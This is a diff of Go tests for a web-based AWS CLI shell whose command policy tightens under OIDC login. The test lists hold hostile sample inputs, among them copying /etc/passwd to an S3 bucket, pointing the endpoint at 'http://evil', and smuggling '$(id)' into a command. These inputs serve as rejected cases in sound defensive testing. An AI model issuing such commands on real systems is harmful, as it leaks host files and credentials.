@@ -231,7 +231,7 @@ func TestShellCompletion(t *testing.T) {
 	)
 	r.Header.Set("Content-Type", "application/json")
 	s.serveShell(w, r)
-	if !strings.Contains(w.Body.String(), `["s3api","secretsmanager","sqs","ssm","sts"]`) {
+	if !strings.Contains(w.Body.String(), `["s3","s3api"]`) {
 		t.Fatal(w.Body)
 	}
 }
@@ -303,6 +303,8 @@ func TestShellLocalCredentialsRespectAccountMappings(t *testing.T) {
 	}
 }
 
+// TestShellRejectsHostCapabilities covers the OIDC policy; without OIDC the
+// local user runs the whole CLI.
 func TestShellRejectsHostCapabilities(t *testing.T) {
 	for _, line := range []string{
 		"aws s3 cp /etc/passwd s3://bucket/key", "aws s3 sync s3://bucket /tmp",
@@ -324,36 +326,48 @@ func TestShellRejectsHostCapabilities(t *testing.T) {
 		"aws sts get-caller-identity --out json --endp=http://evil",
 	} {
 		t.Run(line, func(t *testing.T) {
-			if _, err := shellArgv(line); err == nil {
-				t.Fatal("host capability accepted")
+			args, err := shellArgv(line)
+			if err == nil {
+				err = shellPolicy(args)
+			}
+
+			if err == nil {
+				t.Fatal("host capability accepted under OIDC")
 			}
 		})
 	}
 }
 
-func TestShellCompletionNeverExecutesOrListsFiles(t *testing.T) {
-	dir := fakeShellCLI(t, "exit 77\n")
-	marker := filepath.Join(dir, "executed")
-	if err := os.WriteFile(filepath.Join(dir, "aws_completer"),
-		[]byte("#!/bin/sh\ntouch '"+marker+"'\nprintf host-secret\n"), 0o700); err != nil {
-		t.Fatal(err)
-	}
-
-	for _, line := range []string{
-		"aws s", "aws s3api list-", "aws s3 cp /", "aws $(id)", "aws help", "aws ssm get-parameter /",
+func TestShellStaticCompletionFollowsPolicy(t *testing.T) {
+	for line, want := range map[string]string{
+		"aws s":            `["s3api","secretsmanager","sqs","ssm","sts"]`,
+		"aws s3api list-":  `["list-buckets","list-objects-v2"]`,
+		"aws s3 cp /":      `[]`,
+		"aws $(id)":        `[]`,
+		"aws ssm get-par":  `["get-parameter","get-parameters"]`,
+		"aws codeartifact": `[]`,
 	} {
-		r := shellRequestFor(line)
-		data, _ := json.Marshal(shellRequest{Command: line, Account: "123456789012", Complete: true})
-		r.Body = io.NopCloser(strings.NewReader(string(data)))
 		w := httptest.NewRecorder()
-		shellServer(t).serveShell(w, r)
-		if w.Code != http.StatusOK || strings.Contains(w.Body.String(), "host-secret") {
-			t.Fatal(line, w.Code, w.Body)
+		completeShellStatic(w, line)
+		if strings.TrimSpace(w.Body.String()) != `{"candidates":`+want+`}` {
+			t.Error(line, w.Body)
 		}
 	}
+}
 
-	if _, err := os.Stat(marker); !os.IsNotExist(err) {
-		t.Fatal("completion executed a host helper", err)
+func TestShellWithoutOIDCRunsTheWholeCLI(t *testing.T) {
+	fakeShellCLI(t, "printf '%s ' \"$@\"\n")
+	s := shellServer(t)
+	w := httptest.NewRecorder()
+	s.serveShell(w, shellRequestFor("aws s3 cp s3://bucket/key ./key"))
+	_, stdout, _ := shellEvents(t, w.Body)
+	if !strings.Contains(stdout, "s3 cp s3://bucket/key ./key") {
+		t.Fatal(w.Code, stdout)
+	}
+
+	s.cfg.Console.Auth.OIDC = &config.OIDC{}
+	if s.shellStrict() != true {
+		t.Fatal("OIDC must restrict CloudShell")
 	}
 }
 
@@ -364,7 +378,12 @@ func TestShellPolicyAllowsInlineAPIValues(t *testing.T) {
 		`aws dynamodb put-item --table-name t --item '{"pk":{"S":"value"}}'`,
 		`aws sqs send-message --queue-url /000000000000/q --message-body 'hello world'`,
 	} {
-		if _, err := shellArgv(line); err != nil {
+		args, err := shellArgv(line)
+		if err == nil {
+			err = shellPolicy(args)
+		}
+
+		if err != nil {
 			t.Fatal(line, err)
 		}
 	}
